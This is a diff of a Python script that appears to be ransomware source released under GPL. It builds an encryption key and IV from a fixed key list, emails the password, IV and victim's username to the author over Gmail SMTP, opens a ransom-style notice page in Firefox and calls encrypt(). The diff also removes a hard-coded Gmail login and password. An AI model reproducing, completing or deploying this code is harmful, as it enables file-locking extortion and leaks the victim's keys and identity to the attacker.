@@ -10,8 +10,8 @@ mateus-N00B, Agosto 2016
 Version 1.0
 
 License GPL
-
 '''
+
 import os,sys,time
 import smtplib
 import random
@@ -35,13 +35,9 @@ KEYS = ['68b329da9893e340', '4e5dc3caa06fa07c','ba0cc7fbd788f3aa', '6fad925d1179
 
 seed = str(random.randint(0,35535))
 HASH = hashlib.md5(seed)
-#IV = HASH.hexdigest()
-#IV = str(IV[1:16])
 IV = str(random.choice(KEYS))	
-
 seed = str(random.randint(0,35535))
 HASH = hashlib.md5(seed)
-PASSWORD = HASH.hexdigest()
 PASSWORD = str(random.choice(KEYS))	
 FILES = []
 USER = os.getenv('USER')
@@ -52,7 +48,7 @@ def email_function():
 		mailer = smtplib.SMTP('smtp.gmail.com',25)
 		mailer.ehlo()
 		mailer.starttls()
-		mailer.login('foobarnoobr@gmail.com','ghost1aa')
+		mailer.login('LOGIN','PASS')
 		mailer.sendmail('n00b','TO',"Subject: \nPassword %s\nIV %s\nUSER %s" % (PASSWORD,IV,USER))
 		time.sleep(1)
 		mailer.quit()
@@ -126,5 +122,5 @@ def notification():
 	foo.close()
 	os.system("firefox %s/hello.html" % os.getenv('HOME'))
 
-'''++++++++++++++++++++++++++++++++++ MAIN +++++++++++++++++++++++++++++++++++++++++++++'''
+'''++++++++++++++++++++++++++++++++++ CALL THE FUNCTION +++++++++++++++++++++++++++++++++++++++++++++'''
 encrypt()
